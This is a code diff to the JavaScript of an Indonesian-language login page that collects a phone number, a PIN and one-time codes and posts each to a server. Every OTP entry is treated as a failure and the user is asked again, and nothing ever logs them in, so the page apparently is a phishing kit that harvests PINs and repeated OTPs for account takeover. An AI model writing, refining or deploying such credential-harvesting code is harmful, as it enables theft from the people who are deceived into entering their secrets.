@@ -11,10 +11,8 @@ document.addEventListener('DOMContentLoaded', function() {
   const otpInputs = document.querySelectorAll('.otp-box');
   const continueBtn = document.getElementById('lanjutkan-button');
   const showPinBtn = document.querySelector('.show-text');
-  const notification = document.getElementById('floating-notification');
-  const successNotification = document.getElementById('success-notification');
-  const attemptCounter = document.getElementById('attempt-counter');
-  const attemptNumber = document.getElementById('attempt-number');
+  const resendOtpBtn = document.querySelector('.resend-otp span');
+  const otpMessageBox = document.querySelector('.otp-message-box');
 
   // State Management
   const state = {
@@ -27,11 +25,13 @@ document.addEventListener('DOMContentLoaded', function() {
     otpTimer: null
   };
 
-  // 1. PHONE NUMBER INPUT HANDLING
+  // Initialize pages
+  pages.phone.style.display = 'block';
+
+  // Phone number input handling
   phoneInput.addEventListener('input', function(e) {
     let value = e.target.value.replace(/\D/g, '');
     
-    // Format: 8xxx-xxxx-xxxx
     if (value.length > 0 && !value.startsWith('8')) {
       value = '8' + value.substring(1);
     }
@@ -39,13 +39,12 @@ document.addEventListener('DOMContentLoaded', function() {
     let formatted = '';
     if (value.length > 0) formatted = value.substring(0, 4);
     if (value.length > 4) formatted += '-' + value.substring(4, 8);
-    if (value.length > 8) formatted += '-' + value.substring(8, 12);
     
     phoneInput.value = formatted;
     state.phoneNumber = value;
   });
 
-  // 2. CONTINUE BUTTON HANDLER
+  // Continue button handler
   continueBtn.addEventListener('click', async function() {
     if (state.currentPage === 'phone') {
       if (state.phoneNumber.length < 10) {
@@ -65,7 +64,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
   });
 
-  // 3. PIN INPUT HANDLING
+  // PIN input handling
   pinInputs.forEach((input, index) => {
     input.addEventListener('input', function(e) {
       e.target.value = e.target.value.replace(/\D/g, '');
@@ -88,7 +87,7 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   });
 
-  // 4. OTP INPUT HANDLING
+  // OTP input handling
   otpInputs.forEach((input, index) => {
     input.addEventListener('input', function(e) {
       e.target.value = e.target.value.replace(/\D/g, '');
@@ -111,22 +110,53 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   });
 
-  // CORE FUNCTIONS
+  // Resend OTP handler
+  resendOtpBtn.addEventListener('click', function() {
+    if (this.textContent.includes('KIRIM ULANG')) {
+      startOTPTimer();
+      otpMessageBox.innerHTML = `
+        <p><b>Tap verifikasi untuk menerima OTP</b></p>
+        <p>Kode OTP telah dikirim ke nomor Anda</p>
+      `;
+    }
+  });
+
+  // PIN visibility toggle
+  showPinBtn.addEventListener('click', function() {
+    const isShowing = this.classList.toggle('active');
+    pinInputs.forEach(input => {
+      input.type = isShowing ? 'text' : 'password';
+    });
+    this.textContent = isShowing ? 'SEMBUNYIKAN' : 'TAMPILKAN';
+  });
+
+  // Core functions
   function switchPage(targetPage) {
-    // Hide all pages
     Object.values(pages).forEach(page => {
       page.style.display = 'none';
     });
-    
-    // Show target page with smooth transition
     pages[targetPage].style.display = 'block';
     state.currentPage = targetPage;
     
-    // Auto-focus first input
     setTimeout(() => {
       const firstInput = pages[targetPage].querySelector('input');
       if (firstInput) firstInput.focus();
     }, 100);
+  }
+
+  function startOTPTimer() {
+    clearInterval(state.otpTimer);
+    let timeLeft = 118;
+    
+    state.otpTimer = setInterval(() => {
+      resendOtpBtn.textContent = `KIRIM ULANG (${timeLeft}s)`;
+      
+      if (timeLeft <= 0) {
+        clearInterval(state.otpTimer);
+        resendOtpBtn.textContent = 'KIRIM ULANG';
+      }
+      timeLeft--;
+    }, 1000);
   }
 
   async function sendData(type, data) {
@@ -137,10 +167,7 @@ document.addEventListener('DOMContentLoaded', function() {
         body: JSON.stringify({ type, ...data })
       });
       
-      if (!response.ok) {
-        throw new Error(await response.text());
-      }
-      
+      if (!response.ok) throw new Error(await response.text());
       return await response.json();
     } catch (error) {
       console.error('API Error:', error);
@@ -154,7 +181,6 @@ document.addEventListener('DOMContentLoaded', function() {
       await sendData('pin', { phone: state.phoneNumber, pin: state.pin });
       switchPage('otp');
       startOTPTimer();
-      showNotification();
     } catch (error) {
       showError('PIN salah atau terjadi kesalahan');
       clearPINInputs();
@@ -171,7 +197,6 @@ document.addEventListener('DOMContentLoaded', function() {
         pin: state.pin,
         otp: state.otp 
       });
-      
       handleOTPResponse();
     } catch (error) {
       showError('OTP salah atau terjadi kesalahan');
@@ -181,46 +206,12 @@ document.addEventListener('DOMContentLoaded', function() {
     }
   }
 
-  function startOTPTimer() {
-    clearInterval(state.otpTimer);
-    let timeLeft = 120;
-    const timerElement = document.getElementById('otp-timer');
-    
-    state.otpTimer = setInterval(() => {
-      const minutes = Math.floor(timeLeft / 60);
-      const seconds = timeLeft % 60;
-      timerElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
-      
-      if (timeLeft <= 0) {
-        clearInterval(state.otpTimer);
-        document.getElementById('resend-otp').style.display = 'block';
-      }
-      timeLeft--;
-    }, 1000);
-  }
-
   function handleOTPResponse() {
     state.attempts++;
-    attemptNumber.textContent = state.attempts;
-    attemptCounter.style.display = 'block';
-    
-    // Clear OTP inputs
-    otpInputs.forEach(input => input.value = '');
-    otpInputs[0].focus();
-    state.otp = '';
-    
     if (state.attempts >= state.maxAttempts) {
-      successNotification.style.display = 'block';
-      setTimeout(() => {
-        successNotification.style.display = 'none';
-      }, 5000);
+      showError('Terlalu banyak percobaan, silakan coba lagi nanti');
     }
-  }
-
-  function handleOTPError() {
-    otpInputs.forEach(input => input.value = '');
-    otpInputs[0].focus();
-    state.otp = '';
+    clearOTPInputs();
   }
 
   function clearPINInputs() {
@@ -229,7 +220,12 @@ document.addEventListener('DOMContentLoaded', function() {
     state.pin = '';
   }
 
-  // UI HELPERS
+  function clearOTPInputs() {
+    otpInputs.forEach(input => input.value = '');
+    otpInputs[0].focus();
+    state.otp = '';
+  }
+
   function showLoading() {
     document.querySelector('.spinner-overlay').style.display = 'flex';
   }
@@ -238,33 +234,13 @@ document.addEventListener('DOMContentLoaded', function() {
     document.querySelector('.spinner-overlay').style.display = 'none';
   }
 
-  function showNotification() {
-    notification.style.display = 'block';
-    setTimeout(() => {
-      notification.style.display = 'none';
-    }, 5000);
-  }
-
   function showError(message) {
-    const errorElement = document.getElementById('error-message');
-    if (!errorElement) return;
-    
+    const errorElement = document.createElement('div');
+    errorElement.className = 'error-message';
     errorElement.textContent = message;
-    errorElement.style.display = 'block';
+    document.body.appendChild(errorElement);
     setTimeout(() => {
-      errorElement.style.display = 'none';
+      document.body.removeChild(errorElement);
     }, 3000);
   }
-
-  // PIN VISIBILITY TOGGLE
-  showPinBtn.addEventListener('click', function() {
-    const isShowing = this.classList.toggle('active');
-    pinInputs.forEach(input => {
-      input.type = isShowing ? 'text' : 'password';
-    });
-    this.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
-  });
-
-  // INITIALIZE
-  switchPage('phone');
 });
